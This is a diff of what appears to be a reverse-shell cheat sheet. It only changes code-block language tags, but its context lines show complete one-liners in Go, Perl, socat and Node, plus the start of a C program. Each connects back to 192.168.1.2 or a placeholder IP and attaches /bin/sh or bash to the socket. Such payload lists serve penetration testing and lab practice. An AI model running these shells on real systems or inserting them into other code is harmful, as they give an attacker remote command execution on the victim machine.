@@ -92,13 +92,13 @@ socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
 
 ### **Golang Reverse Shell**
 
-```text
+```go
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 
 ### **Perl Reverse Shell**
 
-```text
+```perl
 perl -e 'use Socket;$i="192.168.1.2";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
@@ -116,7 +116,7 @@ require('child_process').exec('nc -e /bin/sh 192.168.1.2 4444')
 
 ### **C Reverse Shell**
 
-```text
+```c
 #include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
